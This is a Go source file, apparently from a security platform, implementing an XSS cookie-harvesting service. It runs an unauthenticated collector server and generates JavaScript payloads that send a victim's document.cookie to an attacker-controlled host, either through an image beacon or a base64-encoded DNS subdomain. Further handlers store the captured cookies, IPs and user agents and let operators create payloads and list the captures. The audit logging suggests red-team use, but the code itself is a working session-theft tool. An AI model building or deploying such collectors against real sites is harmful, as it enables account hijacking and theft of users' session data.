package handler

import (
	"context"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"sync"

	"jysecai/internal/audit"
	"jysecai/internal/config"
	"jysecai/internal/database"
	"jysecai/internal/security"

	"github.com/gin-gonic/gin"
	"go.uber.org/zap"
)

// XssHandler handles the XSS cookie-harvesting platform endpoints.
// Public (collector) endpoints run on a dedicated HTTP server that does
// not require authentication; authenticated management endpoints are
// mounted under the protected /api/xss/* group by the main router.
type XssHandler struct {
	db     *database.DB
	cfg    *config.XssConfig
	logger *zap.Logger
	audit  *audit.Service
	// collectorMu guards the collector HTTP server lifecycle
	collectorMu     sync.RWMutex
	collectorCancel context.CancelFunc
	collectorSrv    *http.Server
}

// SetAudit wires platform audit logging.
func (h *XssHandler) SetAudit(s *audit.Service) {
	h.audit = s
}

// NewXssHandler creates an XSS handler with the given config.
func NewXssHandler(db *database.DB, cfg *config.XssConfig, logger *zap.Logger) *XssHandler {
	if cfg == nil {
		cfg = &config.XssConfig{}
	}
	if cfg.BindHost == "" {
		cfg.BindHost = "127.0.0.1"
	}
	if cfg.BindPort == 0 {
		cfg.BindPort = 18877
	}
	if cfg.CooldownSeconds == 0 {
		cfg.CooldownSeconds = 60
	}
	return &XssHandler{
		db:     db,
		cfg:    cfg,
		logger: logger,
	}
}

// StartCollector starts the standalone HTTP server that serves the
// public collector endpoints (no auth required).
func (h *XssHandler) StartCollector() {
	h.collectorMu.Lock()
	defer h.collectorMu.Unlock()
	if h.collectorSrv != nil {
		return // already running
	}
	addr := fmt.Sprintf("%s:%d", h.cfg.BindHost, h.cfg.BindPort)
	mux := http.NewServeMux()
	mux.HandleFunc("/xss/", h.serveCollector)
	srv := &http.Server{Addr: addr, Handler: mux}
	ctx, cancel := context.WithCancel(context.Background())
	h.collectorCancel = cancel
	h.collectorSrv = srv
	go func() {
		h.logger.Info("XSS collector server started", zap.String("addr", addr))
		if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			h.logger.Error("XSS collector server error", zap.Error(err))
		}
		<-ctx.Done()
		_ = srv.Close()
	}()
}

// StopCollector shuts down the collector HTTP server.
func (h *XssHandler) StopCollector() {
	h.collectorMu.Lock()
	defer h.collectorMu.Unlock()
	if h.collectorCancel != nil {
		h.collectorCancel()
		h.collectorCancel = nil
	}
	h.collectorSrv = nil
}

// === Public collector endpoints (no auth, served by the collector server) ===

// serveCollector dispatches all /xss/ paths on the public collector server.
func (h *XssHandler) serveCollector(w http.ResponseWriter, r *http.Request) {
	path := strings.TrimPrefix(r.URL.Path, "/xss/")
	path = strings.Trim(path, "/")

	// /:token.js — collector JS
	if strings.HasSuffix(path, ".js") {
		token := strings.TrimSuffix(path, ".js")
		h.ServeCollectorJS(w, r, token)
		return
	}
	// /:token.gif — fallback image beacon (also captures POST)
	if strings.HasSuffix(path, ".gif") {
		token := strings.TrimSuffix(path, ".gif")
		h.ServeCollectorGIF(w, r, token)
		return
	}
	// /:token/capture — capture endpoint (POST)
	parts := strings.SplitN(path, "/", 2)
	if len(parts) == 2 && parts[1] == "capture" {
		h.Capture(w, r, parts[0])
		return
	}
	http.NotFound(w, r)
}

// ServeCollectorJS serves the JavaScript that harvests cookies from the
// victim's browser. It looks up the payload by token, renders the JS,
// and serves it with the correct content-type.
func (h *XssHandler) ServeCollectorJS(w http.ResponseWriter, r *http.Request, token string) {
	payload, err := h.db.GetXssPayloadByToken(token)
	if err != nil || payload == nil {
		http.NotFound(w, r)
		return
	}
	js := h.renderCollectorJS(payload)
	w.Header().Set("Content-Type", "application/x-javascript; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(js))
}

// renderCollectorJS builds the JavaScript payload for a given XSS payload token.
// Minimal: just exfiltrate document.cookie via an image beacon to the GIF
// endpoint. ~75 bytes vs ~600 in the previous XHR+beacon version.
// The collector returns a 1x1 transparent GIF so the browser handles the
// response without any visible side-effect.
func (h *XssHandler) renderCollectorJS(payload *database.XssPayload) string {
	// DNS exfiltration mode: base64-encode cookie into a DNS subdomain.
	// ~60 bytes. Victim browser resolves <b64(cookie)>.domain -> DNS log captures it.
	dnsDomain := payload.DNSExfilDomain
	if dnsDomain == "" {
		dnsDomain = h.cfg.DNSExfilDomain
	}
	if dnsDomain != "" {
		return fmt.Sprintf(`(new Image()).src="http://"+btoa(document.cookie)+".%s"`, dnsDomain)
	}
	// Default HTTP image-beacon — ~75 bytes
	publicURL := strings.TrimRight(h.cfg.PublicURL, "/")
	if publicURL == "" {
		publicURL = "http://" + h.cfg.BindHost
	}
	return fmt.Sprintf(`(new Image()).src="%s/xss/%s.gif?cookie="+encodeURIComponent(document.cookie)`,
		publicURL, payload.Token)
}

// Capture receives cookie data harvested from the victim's browser.
// It is a public endpoint (no auth) — the token in the URL path ties
// the capture to a specific payload.
func (h *XssHandler) Capture(w http.ResponseWriter, r *http.Request, token string) {
	payload, err := h.db.GetXssPayloadByToken(token)
	if err != nil || payload == nil {
		http.NotFound(w, r)
		return
	}

	cookie := r.FormValue("cookie")
	url := r.FormValue("url")
	userAgent := r.FormValue("user_agent")
	referrer := r.FormValue("document_referrer")

	ip := r.Header.Get("X-Forwarded-For")
	if ip == "" {
		ip = r.RemoteAddr
	}

	extra := ""
	if referrer != "" {
		extra = fmt.Sprintf("referrer=%s", referrer)
	}

	_, _ = h.db.CreateXssCapture(payload.ID, payload.Token, cookie, url, payload.Domain, userAgent, ip, extra)
	h.logger.Info("XSS capture received",
		zap.String("token", token),
		zap.String("ip", ip),
		zap.String("url", url),
	)

	// Return a 1x1 transparent GIF so the image-beacon fallback also succeeds
	gifBytes := []byte{0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3b}
	w.Header().Set("Content-Type", "image/gif")
	w.Header().Set("Cache-Control", "no-store, private, max-age=0")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write(gifBytes)
}

// ServeCollectorGIF serves a 1x1 transparent GIF for image-beacon-based
// capture (also accepts the cookie in query params).
func (h *XssHandler) ServeCollectorGIF(w http.ResponseWriter, r *http.Request, token string) {
	payload, err := h.db.GetXssPayloadByToken(token)
	if err != nil || payload == nil {
		http.NotFound(w, r)
		return
	}

	cookie := r.URL.Query().Get("cookie")
	url := r.URL.Query().Get("url")
	userAgent := r.URL.Query().Get("user_agent")

	ip := r.Header.Get("X-Forwarded-For")
	if ip == "" {
		ip = r.RemoteAddr
	}

	if cookie != "" {
		_, _ = h.db.CreateXssCapture(payload.ID, payload.Token, cookie, url, payload.Domain, userAgent, ip, "")
		h.logger.Info("XSS capture (img beacon) received",
			zap.String("token", token),
			zap.String("ip", ip),
		)
	}

	gifBytes := []byte{0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3b}
	w.Header().Set("Content-Type", "image/gif")
	w.Header().Set("Cache-Control", "no-store, private, max-age=0")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write(gifBytes)
}

// === Authenticated management endpoints ===

// GetConfig returns the XSS collector configuration for the admin UI.
func (h *XssHandler) GetConfig(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"enabled":          h.cfg.Enabled,
		"bind_host":        h.cfg.BindHost,
		"bind_port":        h.cfg.BindPort,
		"public_url":       h.cfg.PublicURL,
		"dns_exfil_domain": h.cfg.DNSExfilDomain,
		"cooldown_seconds": h.cfg.CooldownSeconds,
	})
}

// ListPayloads returns all XSS payloads.
func (h *XssHandler) ListPayloads(c *gin.Context) {
	payloads, err := h.db.ListXssPayloads()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	result := make([]gin.H, len(payloads))
	for i, p := range payloads {
		result[i] = gin.H{
			"id":               p.ID,
			"token":            p.Token,
			"name":             p.Name,
			"type":             p.Type,
			"payload":          p.Payload,
			"config":           string(p.Config),
			"project_id":       p.ProjectID,
			"enabled":          p.Enabled == 1,
			"description":      p.Description,
			"domain":           p.Domain,
			"domain_only":      p.DomainOnly,
			"dns_exfil_domain": p.DNSExfilDomain,
			"created_at":       p.CreatedAt,
			"updated_at":       p.UpdatedAt,
			"created_by":       p.CreatedBy,
			"capture_count":    p.CaptureCount,
		}
	}
	c.JSON(http.StatusOK, gin.H{"payloads": result})
}

// CreatePayload creates a new XSS payload.
func (h *XssHandler) CreatePayload(c *gin.Context) {
	var req struct {
		Name           string `json:"name"`
		Type           string `json:"type"`
		Payload        string `json:"payload"`
		Config         string `json:"config"`
		ProjectID      string `json:"project_id"`
		Enabled        *bool  `json:"enabled"`
		Description    string `json:"description"`
		Domain         string `json:"domain"`
		DomainOnly     *int   `json:"domain_only"`
		DNSExfilDomain string `json:"dns_exfil_domain"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	token := database.GenerateXssToken()
	p := &database.XssPayload{
		Token:          token,
		Name:           req.Name,
		Type:           req.Type,
		Payload:        req.Payload,
		Config:         []byte(req.Config),
		ProjectID:      strings.TrimSpace(req.ProjectID),
		Enabled:        1,
		Description:    req.Description,
		Domain:         req.Domain,
		DNSExfilDomain: strings.TrimSpace(req.DNSExfilDomain),
	}
	if req.Enabled != nil {
		if *req.Enabled {
			p.Enabled = 1
		} else {
			p.Enabled = 0
		}
	}
	if req.DomainOnly != nil {
		p.DomainOnly = *req.DomainOnly
	}
	if p.Type == "" {
		p.Type = "image"
	}

	id, err := h.db.CreateXssPayload(p)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	if session, ok := security.CurrentSession(c); ok {
		p.CreatedBy = session.UserID
		_ = h.db.SetResourceOwner("xss_payload", strconv.FormatInt(id, 10), session.UserID)
		_ = h.db.AssignResourceToUser(session.UserID, "xss_payload", strconv.FormatInt(id, 10))
	}

	if h.audit != nil {
		h.audit.RecordOK(c, "xss", "payload_create", "创建 XSS 载荷", "xss_payload", strconv.FormatInt(id, 10), map[string]interface{}{
			"token": token, "name": req.Name,
		})
	}

	publicURL := h.cfg.PublicURL
	if publicURL == "" {
		publicURL = fmt.Sprintf("http://%s:%d", h.cfg.BindHost, h.cfg.BindPort)
	}
	c.JSON(http.StatusOK, gin.H{
		"id":         id,
		"token":      token,
		"public_url": strings.TrimRight(publicURL, "/") + "/xss/" + token + ".js",
	})
}

// GetPayload returns a single XSS payload by ID.
func (h *XssHandler) GetPayload(c *gin.Context) {
	id, _ := strconv.ParseInt(c.Param("id"), 10, 64)
	payload, err := h.db.GetXssPayload(id)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if payload == nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "payload not found"})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"id":               payload.ID,
		"token":            payload.Token,
		"name":             payload.Name,
		"type":             payload.Type,
		"payload":          payload.Payload,
		"config":           string(payload.Config),
		"project_id":       payload.ProjectID,
		"enabled":          payload.Enabled == 1,
		"description":      payload.Description,
		"domain":           payload.Domain,
		"domain_only":      payload.DomainOnly,
		"dns_exfil_domain": payload.DNSExfilDomain,
		"created_at":       payload.CreatedAt,
		"updated_at":       payload.UpdatedAt,
		"created_by":       payload.CreatedBy,
		"capture_count":    payload.CaptureCount,
	})
}

// DeletePayload deletes an XSS payload and its captures.
func (h *XssHandler) DeletePayload(c *gin.Context) {
	id, _ := strconv.ParseInt(c.Param("id"), 10, 64)
	if err := h.db.DeleteXssPayload(id); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if h.audit != nil {
		h.audit.RecordOK(c, "xss", "payload_delete", "删除 XSS 载荷", "xss_payload", strconv.FormatInt(id, 10), nil)
	}
	c.JSON(http.StatusOK, gin.H{"deleted": true})
}

// ListCaptures returns all XSS captures, optionally filtered by payload.
func (h *XssHandler) ListCaptures(c *gin.Context) {
	var captures []*database.XssCapture
	var err error
	if payloadIDStr := c.Query("payload_id"); payloadIDStr != "" {
		pid, perr := strconv.ParseInt(payloadIDStr, 10, 64)
		if perr != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid payload_id"})
			return
		}
		captures, err = h.db.ListXssCapturesByPayload(pid)
	} else {
		captures, err = h.db.ListXssCaptures()
	}
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	result := make([]gin.H, len(captures))
	for i, cap := range captures {
		result[i] = gin.H{
			"id":         cap.ID,
			"payload_id": cap.PayloadID,
			"token":      cap.Token,
			"cookie":     cap.Cookie,
			"url":        cap.URL,
			"domain":     cap.Domain,
			"user_agent": cap.UserAgent,
			"ip":         cap.IP,
			"extra":      cap.Extra,
			"created_at": cap.CreatedAt,
		}
	}
	c.JSON(http.StatusOK, gin.H{"captures": result})
}
